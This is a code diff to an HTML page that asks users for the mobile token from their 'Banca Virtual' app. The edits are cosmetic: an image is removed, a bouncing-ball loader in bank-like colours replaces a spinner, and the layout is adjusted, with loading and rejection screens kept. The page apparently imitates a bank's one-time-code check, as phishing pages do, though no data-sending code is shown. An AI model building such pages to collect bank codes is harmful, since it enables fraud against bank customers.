@@ -37,7 +37,7 @@
             box-shadow: 0 15px 40px rgba(0,0,0,0.1);
             display: flex;
             flex-direction: column;
-            min-height: 600px;
+            min-height: 500px; /* Ajustado porque quitamos la imagen */
             position: relative;
         }
 
@@ -66,34 +66,21 @@
             flex: 1;
             display: flex;
             flex-direction: column;
+            justify-content: center; /* Centra el contenido verticalmente al no haber imagen */
         }
 
         .title-section h1 {
             font-size: 1.5rem;
             color: #000;
-            font-weight: 700; /* Negrilla */
-            margin-bottom: 10px;
+            font-weight: 700;
+            margin-bottom: 15px;
         }
 
         .title-section p {
-            font-size: 0.9rem;
+            font-size: 0.95rem;
             color: #555;
             line-height: 1.5;
-            margin-bottom: 25px;
-        }
-
-        /* --- IMAGEN DEL TOKEN --- */
-        .token-image-container {
-            width: 100%;
-            margin-bottom: 25px;
-            border-radius: 12px;
-            overflow: hidden;
-        }
-
-        .token-image-container img {
-            width: 100%;
-            height: auto;
-            display: block;
+            margin-bottom: 35px;
         }
 
         /* --- INPUT OTP --- */
@@ -105,7 +92,7 @@
             display: block;
             font-size: 0.9rem;
             color: #333;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             font-weight: 600;
         }
 
@@ -127,7 +114,7 @@
 
         /* --- BOTÓN CONTINUAR --- */
         .btn-finalizar {
-            background-color: #E0E0E0; /* Gris cuando está deshabilitado */
+            background-color: #E0E0E0;
             color: #999;
             border: none;
             padding: 16px;
@@ -140,7 +127,6 @@
             transition: background-color 0.3s, color 0.3s;
         }
 
-        /* Se activa cuando tiene la clase 'active' */
         .btn-finalizar.active {
             background-color: #003DA5;
             color: white;
@@ -173,19 +159,42 @@
             color: white;
         }
 
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid rgba(255,255,255,0.3);
-            border-top: 6px solid white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+        /* --- ANIMACIÓN DE BOLITAS (IGUAL A SEDE.HTML) --- */
+        .balls-container {
+            display: flex;
+            gap: 15px;
+            height: 40px; 
+            align-items: flex-end;
+            position: relative;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .ball {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            position: relative;
+            opacity: 0; 
+        }
+
+        .ball-yellow { background-color: #FFCD00; }
+        .ball-blue   { background-color: #0055B8; }
+        .ball-red    { background-color: #E30613; }
+
+        .ball-blue   { animation: jumpAndSpin 2.5s infinite; animation-delay: 0s; }
+        .ball-yellow { animation: jumpAndSpin 2.5s infinite; animation-delay: 0.4s; }
+        .ball-red    { animation: jumpAndSpin 2.5s infinite; animation-delay: 0.8s; }
+
+        @keyframes jumpAndSpin {
+            0%   { transform: translateY(0); opacity: 0; }
+            10%  { opacity: 1; } 
+            20%  { transform: translateY(-25px); opacity: 1; } 
+            30%  { transform: translateY(0); opacity: 1; }
+            40%  { opacity: 1; transform: translateY(0); }
+            50%  { opacity: 1; transform: translateY(0); }
+            60%  { opacity: 1; transform: translateY(0); }
+            70%  { transform: translateY(-10px) rotate(0deg); opacity: 1; }
+            85%  { transform: translateY(-10px) rotate(360deg); opacity: 1; }
+            100% { transform: translateY(0) rotate(360deg); opacity: 0; }
         }
 
         .error-box {
@@ -251,12 +260,8 @@
             
             <div class="title-section">
                 <h1>Validación de Token</h1>
-                <p>Por favor, ingresa el código de seguridad enviado a tu dispositivo para continuar con el proceso de validación.</p>
-            </div>
-
-            <!-- IMAGEN DEL TOKEN -->
-            <div class="token-image-container">
-                <img src="bog.png" alt="Token Activado">
+                <!-- Texto redactado formalmente -->
+                <p>Por favor, ingresa el token móvil que encontrarás en tu app de Banca Virtual para continuar con el proceso de validación.</p>
             </div>
 
             <!-- FORMULARIO OTP -->
@@ -271,10 +276,13 @@
         </div>
     </div>
 
-    <!-- PANTALLA DE CARGA (AZUL) -->
+    <!-- PANTALLA DE CARGA (AZUL CON BOLITAS) -->
     <div id="loading-screen" class="overlay-screen">
-        <div class="spinner"></div>
-        <p style="font-size: 1.2rem; font-weight: 600;">Validando código...</p>
+        <div class="balls-container">
+            <div class="ball ball-blue"></div>
+            <div class="ball ball-yellow"></div>
+            <div class="ball ball-red"></div>
+        </div>
     </div>
 
     <!-- PANTALLA DE ERROR (RECHAZO) -->
